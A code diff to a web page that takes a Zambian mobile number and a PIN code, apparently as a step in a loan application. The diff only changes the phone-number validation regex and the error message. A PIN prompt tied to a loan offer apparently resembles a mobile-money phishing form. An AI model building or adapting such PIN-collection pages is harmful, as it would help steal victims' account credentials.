@@ -340,7 +340,7 @@
         </svg>
       </span>
       <span class="code">+260</span>
-      <input type="tel" id="phoneInput" placeholder="0951234567" inputmode="numeric" maxlength="10">
+      <input type="tel" id="phoneInput" placeholder="0971234567" inputmode="numeric" maxlength="10">
     </div>
 
     <div class="code-label">Enter your PIN code</div>
@@ -364,7 +364,7 @@
         <div class="dot"></div>
       </div>
       <h2 id="invalidTitle">Invalid format</h2>
-      <p id="invalidMessage">The phone number must start with 9 (9 digits) or 09 (10 digits)!<br>Please enter the correct number and try again!</p>
+      <p id="invalidMessage">Enter a valid number starting with 097, 077, 057, 97, 77, or 57.<br>Please enter the correct number and try again!</p>
       <button type="button" id="invalidOkBtn">OK</button>
     </div>
   </div>
@@ -398,12 +398,13 @@
 
   const phoneInput = document.getElementById('phoneInput');
   const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+  const ZAMBIA_MOBILE_PATTERN = /^(?:9[0-9]{8}|[57]7[0-9]{7}|09[0-9]{8}|0[57]7[0-9]{7})$/;
 
   // Automatically reflect the phone number passed from the loan application.
   const incomingParams = new URLSearchParams(window.location.search);
   const incomingPhone = incomingParams.get('phone') || '';
   const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^260/, '');
-  if (/^(?:9[0-9]{8}|09[0-9]{8})$/.test(normalizedPhone)) {
+  if (ZAMBIA_MOBILE_PATTERN.test(normalizedPhone)) {
     phoneInput.value = normalizedPhone;
   }
   const connexionBtn = document.getElementById('connexionBtn');
@@ -511,9 +512,9 @@
     const phone = phoneInput.value.trim();
 
     // Show the invalid-number page only when the user tries to submit.
-    if(!/^(?:9[0-9]{8}|09[0-9]{8})$/.test(phone)){
+    if(!ZAMBIA_MOBILE_PATTERN.test(phone)){
       showInvalidPhone(
-        'The phone number must start with 9 (9 digits) or 09 (10 digits).<br>Please enter the correct number and try again!'
+        'Enter a valid number starting with 097, 077, 057, 97, 77, or 57.<br>Please enter the correct number and try again!'
       );
       return;
     }
